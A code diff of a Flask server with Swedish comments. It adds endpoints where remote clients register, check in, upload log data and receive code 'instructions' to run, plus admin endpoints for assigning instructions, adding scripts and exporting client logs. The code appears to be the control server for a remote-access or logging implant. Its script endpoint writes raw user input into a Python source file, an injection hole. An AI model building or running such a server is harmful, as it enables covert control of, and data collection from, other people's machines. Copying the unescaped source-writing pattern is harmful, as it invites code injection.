+            existing_data["ip"] = ip_address
+        else:
+            logging.info(f"Skapar ny klient {client_id}")
+            # Lägg till standard och infodata
+            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            client_data.update({
+                "ip": ip_address,
+                "first_seen": current_time,
+                "last_activity": current_time,
+                "instruction": client_data.get("instruction", "standard"),
+                "is_active": True
+            })
+            client_index[client_id] = client_data
+        
+        # Spara uppdaterat index
+        with open(INDEX_FILE, "w", encoding="utf-8") as f:
+            json.dump(client_index, f, indent=4)
+            
+        logging.info(f"Klient {client_id} registrerad framgångsrikt")
+        
+        # Hämta aktiv instruktion att skicka tillbaka
+        instruction_name = client_index[client_id].get("instruction", "standard")
+        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
+        
+        return jsonify({
+            "status": "success", 
+            "message": f"Klient {client_id} registrerad", 
+            "instruction": instruction_name,
+            "code": instruction_code
+        })
+            
+    except Exception as e:
+        logging.error(f"Fel vid registrering av klient: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({
+            "status": "error", 
+            "message": f"Registreringsfel: {str(e)}"
+        }), 500
+
+@app.route("/api/heartbeat/<client_id>", methods=["POST"])
+def api_heartbeat(client_id):
+    """API för klientheartbeat."""
+    ip_address = request.remote_addr
+    logging.debug(f"Heartbeat från klient {client_id} på IP {ip_address}")
+    
+    try:
+        # Kontrollera om klienten finns, annars returnera fel
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+        
+        if client_id not in client_index:
+            logging.warning(f"Heartbeat för okänd klient {client_id}")
+            return jsonify({"status": "error", "message": "Okänd klient"}), 404
+        
+        # Uppdatera senaste aktivitet
+        client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        client_index[client_id]["ip"] = ip_address
+        
+        # Uppdatera andra fält om tillhandahållet
+        additional_data = {}
+        if request.is_json:
+            additional_data = request.get_json()
+        elif request.form:
+            additional_data = request.form.to_dict()
+            
+        for key, value in additional_data.items():
+            if key not in ["id", "last_activity", "first_seen"]:
+                client_index[client_id][key] = value
+                
+        # Spara uppdaterat index
+        with open(INDEX_FILE, "w", encoding="utf-8") as f:
+            json.dump(client_index, f, indent=4)
+            
+        logging.debug(f"Heartbeat uppdaterad för klient {client_id}")
+        
+        # Hämta aktiv instruktion att skicka tillbaka
+        instruction_name = client_index[client_id].get("instruction", "standard")
+        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
+        
+        return jsonify({
+            "status": "success", 
+            "instruction": instruction_name,
+            "code": instruction_code
+        })
+        
+    except Exception as e:
+        logging.error(f"Fel vid hantering av heartbeat för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({
+            "status": "error", 
+            "message": f"Heartbeat-fel: {str(e)}"
+        }), 500
+
+@app.route("/api/log/<client_id>", methods=["POST"])
+def api_log(client_id):
+    """API för klientloggning."""
+    ip_address = request.remote_addr
+    logging.debug(f"Loggförfrågan från klient {client_id} på IP {ip_address}")
+    
+    try:
+        # Kontrollera om klienten finns
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+                
+        # Om klienten inte finns, registrera den
+        if client_id not in client_index:
+            logging.warning(f"Loggning från okänd klient {client_id}, registrerar...")
+            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            client_index[client_id] = {
+                "id": client_id,
+                "name": f"Unknown-{client_id[:8]}",
+                "ip": ip_address,
+                "first_seen": current_time,
+                "last_activity": current_time,
+                "instruction": "standard",
+                "is_active": True,
+                "os": "Unknown"
+            }
+        
+        # Uppdatera senaste aktivitet
+        client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        client_index[client_id]["ip"] = ip_address
+        
+        # Säkerställ att loggkataloger finns
+        os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
+        
+        # Skriv loggdata till klientspecifik fil
+        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
+        log_data = ""
+        
+        if request.is_json:
+            json_data = request.get_json()
+            log_data = json_data.get("data", "")
+            # Uppdatera ytterligare klientinformation om tillhandahållet
+            for key, value in json_data.items():
+                if key not in ["data", "last_activity", "first_seen"] and value:
+                    client_index[client_id][key] = value
+        else:
+            # Om inte JSON, försök att hämta loggdata från form eller direkt body
+            log_data = request.form.get("data", request.get_data(as_text=True))
+        
+        # Generera tidsstämpel för logginlägget
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"{timestamp} [{client_id}] {log_data}\n"
+        
+        # Skriv loggen
+        with open(client_log_file, "a", encoding="utf-8") as f:
+            f.write(log_entry)
+            
+        # Spara uppdaterat index
+        with open(INDEX_FILE, "w", encoding="utf-8") as f:
+            json.dump(client_index, f, indent=4)
+            
+        logging.debug(f"Logg sparad för klient {client_id}")
+        
+        # Returnera aktuell instruktion
+        instruction_name = client_index[client_id].get("instruction", "standard")
+        return jsonify({
+            "status": "success", 
+            "instruction": instruction_name,
+            "message": "Loggdata mottagen"
+        })
+        
+    except Exception as e:
+        logging.error(f"Fel vid loggning för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({
+            "status": "error", 
+            "message": f"Loggningsfel: {str(e)}"
+        }), 500
+
+@app.route("/api/clients", methods=["GET"])
+def api_get_clients():
+    """API för att hämta alla klienter."""
+    logging.debug(f"Förfrågan om klientlista från {request.remote_addr}")
+    
+    try:
+        # Läs klientindex
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+        
+        # Uppdatera aktivitetsstatus
+        for client_id, client_info in client_index.items():
+            client_info["isActive"] = is_client_active(client_info.get("last_activity", ""))
+            # Konvertera till format som passar frontend
+            client_info["lastSeen"] = client_info.get("last_activity", "Unknown")
+            client_info["name"] = client_info.get("name", f"Unknown-{client_id[:8]}")
+            client_info["os"] = client_info.get("os", "Unknown")
+            client_info["system"] = client_info.get("system", "Unknown")
+            client_info["publicIp"] = client_info.get("public_ip", "Unknown")
+            client_info["privateIp"] = client_info.get("ip", "Unknown")
+            client_info["firstSeen"] = client_info.get("first_seen", "Unknown")
+            # Sätt ID i varje objekt
+            client_info["id"] = client_id
+        
+        client_list = list(client_index.values())
+        logging.debug(f"Returnerar {len(client_list)} klienter")
+        
+        return jsonify(client_list)
+    
+    except Exception as e:
+        logging.error(f"Fel vid hämtning av klientlista: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify([]), 500
+
+@app.route("/api/client/<client_id>", methods=["GET"])
+def api_get_client(client_id):
+    """API för att hämta en specifik klient."""
+    logging.debug(f"Förfrågan om klient {client_id} från {request.remote_addr}")
+    
+    try:
+        # Läs klientindex
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+        
+        # Kontrollera om klienten finns
+        if client_id not in client_index:
+            logging.warning(f"Förfrågan om okänd klient {client_id}")
+            return jsonify({"status": "error", "message": "Klient hittades inte"}), 404
+        
+        client_info = client_index[client_id]
+        # Uppdatera aktivitetsstatus
+        client_info["isActive"] = is_client_active(client_info.get("last_activity", ""))
+        # Konvertera till format som passar frontend
+        client_info["lastSeen"] = client_info.get("last_activity", "Unknown")
+        client_info["id"] = client_id
+        
+        logging.debug(f"Returnerar info om klient {client_id}")
+        
+        return jsonify(client_info)
+    
+    except Exception as e:
+        logging.error(f"Fel vid hämtning av klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route("/api/ping_client/<client_id>", methods=["POST"])
+def api_ping_client(client_id):
+    """API för att pinga en klient."""
+    logging.debug(f"Pingförfrågan för klient {client_id} från {request.remote_addr}")
+    
+    try:
+        # Läs klientindex
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+        
+        # Kontrollera om klienten finns
+        if client_id not in client_index:
+            logging.warning(f"Försök att pinga okänd klient {client_id}")
+            return jsonify({"status": "error", "message": "Klient hittades inte"}), 404
+        
+        # Uppdatera ping-status
+        client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Skriv till loggfil att ping skickades
+        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"{timestamp} [SERVER] Ping skickad till klienten\n"
+        
+        with open(client_log_file, "a", encoding="utf-8") as f:
+            f.write(log_entry)
+        
+        # Spara uppdaterat index
+        with open(INDEX_FILE, "w", encoding="utf-8") as f:
+            json.dump(client_index, f, indent=4)
+        
+        logging.info(f"Ping skickad till klient {client_id}")
+        
+        return jsonify({
+            "status": "success", 
+            "message": f"Ping skickad till klient {client_id}"
+        })
+    
+    except Exception as e:
+        logging.error(f"Fel vid ping av klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route("/api/clear_logs/<client_id>", methods=["POST"])
+def api_clear_logs(client_id):
+    """API för att rensa loggar för en klient."""
+    logging.debug(f"Förfrågan om att rensa loggar för klient {client_id} från {request.remote_addr}")
+    
+    try:
+        # Kontrollera om loggfilen finns
+        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
+        if not os.path.exists(client_log_file):
+            logging.warning(f"Försök att rensa icke-existerande loggfil för klient {client_id}")
+            return jsonify({"status": "error", "message": "Inga loggar hittades för klienten"}), 404
+        
+        # Rensa loggar genom att öppna filen i write-mode och stänga den direkt
+        with open(client_log_file, "w", encoding="utf-8") as f:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"{timestamp} [SERVER] Loggarna rensades av administratören\n")
+        
+        logging.info(f"Loggar rensade för klient {client_id}")
+        
+        return jsonify({
+            "status": "success", 
+            "message": f"Loggar rensade för klient {client_id}"
+        })
+    
+    except Exception as e:
+        logging.error(f"Fel vid rensning av loggar för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route("/api/set_instruction/<client_id>", methods=["POST"])
+def api_set_instruction(client_id):
+    """API för att sätta instruktion för en klient."""
+    logging.debug(f"Förfrågan om att sätta instruktion för klient {client_id} från {request.remote_addr}")
+    
+    try:
+        # Läs klientindex
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+        
+        # Kontrollera om klienten finns
+        if client_id not in client_index:
+            logging.warning(f"Försök att sätta instruktion för okänd klient {client_id}")
+            return jsonify({"status": "error", "message": "Klient hittades inte"}), 404
+        
+        # Hämta och validera instruktion
+        data = {}
+        if request.is_json:
+            data = request.get_json()
+        else:
+            data = request.form.to_dict()
+            
+        instruction = data.get("instruction", "")
+        
+        if not instruction or instruction not in INSTRUCTIONS:
+            logging.warning(f"Ogiltigt instruktionsförsök: {instruction}")
+            return jsonify({
+                "status": "error", 
+                "message": f"Ogiltig instruktion. Giltiga val: {', '.join(INSTRUCTIONS.keys())}"
+            }), 400
+        
+        # Uppdatera klientinstruktion
+        client_index[client_id]["instruction"] = instruction
+        
+        # Skriv till loggfil att instruktion uppdaterades
+        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"{timestamp} [SERVER] Instruktion uppdaterad till '{instruction}'\n"
+        
+        with open(client_log_file, "a", encoding="utf-8") as f:
+            f.write(log_entry)
+        
+        # Spara uppdaterat index
+        with open(INDEX_FILE, "w", encoding="utf-8") as f:
+            json.dump(client_index, f, indent=4)
+        
+        logging.info(f"Instruktion för klient {client_id} uppdaterad till '{instruction}'")
+        
+        return jsonify({
+            "status": "success", 
+            "message": f"Instruktion uppdaterad för klient {client_id}"
+        })
+    
+    except Exception as e:
+        logging.error(f"Fel vid uppdatering av instruktion för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route("/api/scripts", methods=["GET"])
+def api_get_scripts():
+    """API för att hämta alla tillgängliga scripts."""
+    logging.debug(f"Förfrågan om scriptlista från {request.remote_addr}")
+    
+    try:
+        # Bygger ett objekt med alla scripts och deras kod
+        scripts = {}
+        
+        # Lägg till alla instruktioner från instructions.py
+        for key, value in INSTRUCTIONS.items():
+            scripts[key] = value
+            
+        logging.debug(f"Returnerar {len(scripts)} scripts")
+        return jsonify(scripts)
+    
+    except Exception as e:
+        logging.error(f"Fel vid hämtning av scripts: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({}), 500
+
+@app.route("/api/scripts", methods=["POST"])
+def api_add_script():
+    """API för att lägga till ett nytt script."""
+    logging.debug(f"Förfrågan om att lägga till script från {request.remote_addr}")
+    
+    try:
+        # Hämta data
+        if not request.is_json:
+            return jsonify({"status": "error", "message": "JSON-data krävs"}), 400
+            
+        data = request.get_json()
+        name = data.get("name", "").strip()
+        content = data.get("content", "").strip()
+        
+        if not name or not content:
+            return jsonify({"status": "error", "message": "Både namn och innehåll krävs"}), 400
+            
+        if not name.isalnum() and not (name.isalnum() or '_' in name):
+            return jsonify({"status": "error", "message": "Scriptnamn får bara innehålla bokstäver, siffror och understreck"}), 400
+            
+        # Verifiera att namnet inte redan finns
+        if name in INSTRUCTIONS:
+            return jsonify({"status": "error", "message": f"Ett script med namnet '{name}' finns redan"}), 409
+            
+        # Lägg till scriptet i instructions.py
+        instructions_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "instructions.py")
+        
+        with open(instructions_file, "r", encoding="utf-8") as f:
+            instructions_content = f.read()
+            
+        # Förbered nya scriptet
+        new_script = f'\n    "{name}": """\n{content}\n""",\n}}'
+        
+        # Ersätt slutet av dictdeklarationen
+        instructions_content = instructions_content.replace("}}", new_script)
+        
+        with open(instructions_file, "w", encoding="utf-8") as f:
+            f.write(instructions_content)
+            
+        # För att omedelbart tillgängliggöra det nya scriptet, uppdatera INSTRUCTIONS
+        INSTRUCTIONS[name] = content
+            
+        logging.info(f"Lagt till nytt script: {name}")
+        
+        return jsonify({
+            "status": "success", 
+            "message": f"Script '{name}' lagt till"
+        })
+    
+    except Exception as e:
+        logging.error(f"Fel vid tillägg av script: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route("/api/update_credentials", methods=["POST"])
 def api_update_credentials():
@@ -1008,6 +1269,69 @@ def api_update_credentials():
         logging.error(f"Fel vid uppdatering av adminuppgifter: {e}")
         logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
         return jsonify({"status": "error", "message": f"Fel vid uppdatering av uppgifter: {str(e)}"}), 500
+
+@app.route("/api/clients/<client_id>/ping", methods=["POST"])
+def api_clients_ping(client_id):
+    """API för att pinga en klient från React-frontend."""
+    logging.debug(f"Pingförfrågan för klient {client_id} från React-frontend")
+    
+    # Samma funktionalitet som api_ping_client
+    return api_ping_client(client_id)
+
+@app.route("/api/clients/<client_id>/logs", methods=["DELETE"])
+def api_clients_clear_logs(client_id):
+    """API för att rensa loggar för en klient från React-frontend."""
+    logging.debug(f"Rensningförfrågan för klient {client_id} loggar från React-frontend")
+    
+    # Samma funktionalitet som api_clear_logs
+    return api_clear_logs(client_id)
+
+@app.route("/api/clients/<client_id>/logs/export", methods=["GET"])
+def api_clients_export_logs(client_id):
+    """API för att exportera loggar för en klient."""
+    logging.debug(f"Exportförfrågan för klient {client_id} loggar från {request.remote_addr}")
+    
+    try:
+        # Kontrollera om loggfilen finns
+        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
+        if not os.path.exists(client_log_file):
+            logging.warning(f"Försök att exportera icke-existerande loggfil för klient {client_id}")
+            return jsonify({"status": "error", "message": "Inga loggar hittades för klienten"}), 404
+        
+        # Skapa en minnesbuffert för zip-filen
+        memory_file = BytesIO()
+        
+        # Skapa zip-arkiv i minnet
+        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+            # Läs och lägg till loggfilen
+            with open(client_log_file, 'rb') as f:
+                zf.writestr(f"client_{client_id}.log", f.read())
+        
+        # Sätt pekaren till början av filen
+        memory_file.seek(0)
+        
+        logging.info(f"Exporterar loggar för klient {client_id}")
+        
+        # Returnera zip-filen som nedladdning
+        return send_file(
+            memory_file,
+            mimetype='application/zip',
+            as_attachment=True,
+            download_name=f'logs_{client_id}.zip'
+        )
+    
+    except Exception as e:
+        logging.error(f"Fel vid export av loggar för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route("/api/clients/<client_id>/instruction", methods=["PUT"])
+def api_clients_set_instruction(client_id):
+    """API för att sätta instruktion för en klient från React-frontend."""
+    logging.debug(f"Instruktionsuppdateringsförfrågan för klient {client_id} från React-frontend")
+    
+    # Samma funktionalitet som api_set_instruction men anpassad för PUT-metod
+    return api_set_instruction(client_id)
 
 @app.route("/viewer", methods=["GET", "POST"])
 def viewer():
